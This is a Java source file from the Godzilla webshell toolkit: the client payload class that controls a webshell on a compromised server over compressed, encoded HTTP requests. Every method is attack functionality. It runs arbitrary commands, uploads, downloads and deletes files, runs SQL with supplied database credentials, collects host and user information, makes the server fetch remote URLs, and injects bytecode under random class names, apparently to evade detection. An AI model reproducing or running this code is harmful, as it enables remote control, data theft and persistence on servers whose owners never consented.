package net.BeichenDream.Godzilla.shells.payloads.java;

import net.BeichenDream.Godzilla.core.Encoding;
import net.BeichenDream.Godzilla.core.annotation.PayloadAnnotation;
import net.BeichenDream.Godzilla.core.imp.Payload;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import javassist.ClassPool;
import javassist.CtClass;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.Http;
import net.BeichenDream.Godzilla.util.http.ReqParameter;

@PayloadAnnotation(Name = "JavaDynamicPayload")
public class JavaShell implements Payload {
    private static final String[] ALL_DATABASE_TYPE = {"mysql", "oracle", "sqlserver", "postgresql"};
    private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser) : (.+)";
    private String basicsInfo;
    private String currentDir;
    private String currentUser;
    private HashMap<String, String> dynamicClassNameHashMap;
    private HashSet dynamicClassNameSet;
    private Encoding encoding;
    private String fileRoot;
    private Http http;
    private String osInfo;
    private ShellEntity shell;

    public JavaShell() {
        this.dynamicClassNameSet = null;
        this.dynamicClassNameHashMap = null;
        //this.dynamicClassNameSet = DynamicUpdateClass.getAllDynamicClassName();
        this.dynamicClassNameHashMap = new HashMap<>();
    }

    @Override // core.imp.Payload
    public void init(ShellEntity shellContext) {
        this.shell = shellContext;
        this.http = this.shell.getHttp();
        this.encoding = Encoding.getEncoding(this.shell);
    }

    public String getClassName(String protoName) {
        return this.dynamicClassNameHashMap.get(protoName);
    }

    public synchronized String randomName() {
        String className;
        String[] classNames = (String[]) this.dynamicClassNameSet.toArray(new String[0]);
        className = null;
        if (classNames.length > 0) {
            className = classNames[functions.randomInt(0, classNames.length)];
            this.dynamicClassNameSet.remove(className);
        }
        return className;
    }

    public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
        try {
            CtClass ctClass = ClassPool.getDefault().makeClass(new ByteArrayInputStream(classContent));
            String className = randomName();
            ctClass.setName(className);
            this.dynamicClassNameHashMap.put(protoName, className);
            Log.log("%s ----->>>>> %s", protoName, className);
            classContent = ctClass.toBytecode();
            ctClass.detach();
            return classContent;
        } catch (Exception e) {
            Log.error(e);
            this.dynamicClassNameHashMap.put(protoName, protoName);
            return classContent;
        }
    }

    @Override // core.imp.Payload
    public String getFile(String filePath) {
        ReqParameter parameters = new ReqParameter();
        Encoding encoding2 = this.encoding;
        if (filePath.length() <= 0) {
            filePath = " ";
        }
        parameters.add("dirName", encoding2.Encoding(filePath));
        return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
    }

    @Override // core.imp.Payload
    public byte[] downloadFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        return evalFunc(null, "readFile", parameter);
    }

    @Override // core.imp.Payload
    public String getBasicsInfo() {
        if (this.basicsInfo == null) {
            this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", new ReqParameter()));
        }
        Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, BASICINFO_REGEX);
        this.fileRoot = pxMap.get("FileRoot");
        this.currentDir = pxMap.get("CurrentDir");
        this.currentUser = pxMap.get("CurrentUser");
        this.osInfo = pxMap.get("OsInfo");
        return this.basicsInfo;
    }

    @Override // core.imp.Payload
    public boolean include(String codeName, byte[] binCode) {
        ReqParameter parameters = new ReqParameter();
        byte[] binCode2 = dynamicUpdateClassName(codeName, binCode);
        String codeName2 = this.dynamicClassNameHashMap.get(codeName);
        if (codeName2 != null) {
            parameters.add("codeName", codeName2);
            parameters.add("binCode", binCode2);
            String resultString = new String(evalFunc(null, "include", parameters)).trim();
            if (resultString.equals("ok")) {
                return true;
            }
            Log.error(resultString);
            return false;
        }
        Log.error(String.format("类: %s 映射不存在", codeName2));
        return false;
    }

    @Override // core.imp.Payload
    public byte[] evalFunc(String className, String funcName, ReqParameter praameter) {
        if (className != null && className.trim().length() > 0) {
            praameter.add("evalClassName", getClassName(className));
        }
        praameter.add("methodName", funcName);
        return functions.gzipD(this.http.sendHttpResponse(functions.gzipE(praameter.formatEx())).getResult());
    }

    @Override // core.imp.Payload
    public boolean uploadFile(String fileName, byte[] data) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        parameter.add("fileValue", data);
        String stateString = this.encoding.Decoding(evalFunc(null, "uploadFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean copyFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        String stateString = this.encoding.Decoding(evalFunc(null, "copyFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean deleteFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        String stateString = this.encoding.Decoding(evalFunc(null, "deleteFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean newFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        String stateString = this.encoding.Decoding(evalFunc(null, "newFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean newDir(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dirName", this.encoding.Encoding(fileName));
        String stateString = this.encoding.Decoding(evalFunc(null, "newDir", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, String execSql) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dbType", dbType);
        parameter.add("dbHost", dbHost);
        parameter.add("dbPort", Integer.toString(dbPort));
        parameter.add("dbUsername", dbUsername);
        parameter.add("dbPassword", dbPassword);
        parameter.add("execType", execType);
        parameter.add("execSql", this.encoding.Encoding(execSql));
        return this.encoding.Decoding(evalFunc(null, "execSql", parameter));
    }

    @Override // core.imp.Payload
    public String currentDir() {
        if (this.currentDir != null) {
            return functions.formatDir(this.currentDir);
        }
        getBasicsInfo();
        return functions.formatDir(this.currentDir);
    }

    @Override // core.imp.Payload
    public boolean test() {
        String codeString = new String(evalFunc(null, "test", new ReqParameter()));
        if (codeString.trim().equals("ok")) {
            return true;
        }
        Log.error(codeString);
        return false;
    }

    @Override // core.imp.Payload
    public String currentUserName() {
        if (this.currentUser != null) {
            return this.currentUser;
        }
        getBasicsInfo();
        return this.currentUser;
    }

    @Override // core.imp.Payload
    public String bigFileUpload(String fileName, int position, byte[] content) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileContents", content);
        reqParameter.add("fileName", fileName);
        reqParameter.add("position", String.valueOf(position));
        return this.encoding.Decoding(evalFunc(null, "bigFileUpload", reqParameter));
    }

    @Override // core.imp.Payload
    public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("position", String.valueOf(position));
        reqParameter.add("readByteNum", String.valueOf(readByteNum));
        reqParameter.add("fileName", fileName);
        reqParameter.add("mode", "read");
        return evalFunc(null, "bigFileDownload", reqParameter);
    }

    @Override // core.imp.Payload
    public int getFileSize(String fileName) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileName", fileName);
        reqParameter.add("mode", "fileSize");
        String ret = this.encoding.Decoding(evalFunc(null, "bigFileDownload", reqParameter));
        try {
            return Integer.parseInt(ret);
        } catch (Exception e) {
            Log.error(e);
            Log.error(ret);
            return -1;
        }
    }

    @Override // core.imp.Payload
    public String[] listFileRoot() {
        if (this.fileRoot != null) {
            return this.fileRoot.split(";");
        }
        getBasicsInfo();
        return this.fileRoot.split(";");
    }

    @Override // core.imp.Payload
    public String execCommand(String commandStr) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmdLine", this.encoding.Encoding(commandStr));
        return this.encoding.Decoding(evalFunc(null, "execCommand", parameter));
    }

    @Override // core.imp.Payload
    public String getOsInfo() {
        if (this.osInfo != null) {
            return this.osInfo;
        }
        getBasicsInfo();
        return this.osInfo;
    }

    @Override // core.imp.Payload
    public String[] getAllDatabaseType() {
        return ALL_DATABASE_TYPE;
    }

    @Override // core.imp.Payload
    public boolean moveFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        String stasteString = this.encoding.Decoding(evalFunc(null, "moveFile", parameter));
        if ("ok".equals(stasteString)) {
            return true;
        }
        Log.error(stasteString);
        return false;
    }

    @Override // core.imp.Payload
    public byte[] getPayload() {
        byte[] data = null;
        try {
            InputStream fileInputStream = JavaShell.class.getResourceAsStream("assets/payload.classs");
            data = functions.readInputStream(fileInputStream);
            fileInputStream.close();
        } catch (Exception e) {
            Log.error(e);
        }
        return dynamicUpdateClassName("payload", data);
    }

    @Override // core.imp.Payload
    public boolean fileRemoteDown(String url, String saveFile) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("url", this.encoding.Encoding(url));
        reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
        String result = this.encoding.Decoding(evalFunc(null, "fileRemoteDown", reqParameter));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }

    @Override // core.imp.Payload
    public boolean setFileAttr(String file, String type, String fileAttr) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("type", type);
        reqParameter.add("fileName", this.encoding.Encoding(file));
        reqParameter.add("attr", fileAttr);
        String result = this.encoding.Decoding(evalFunc(null, "setFileAttr", reqParameter));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }

    @Override // core.imp.Payload
    public boolean close() {
        String result = this.encoding.Decoding(evalFunc(null, "close", new ReqParameter()));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }
}
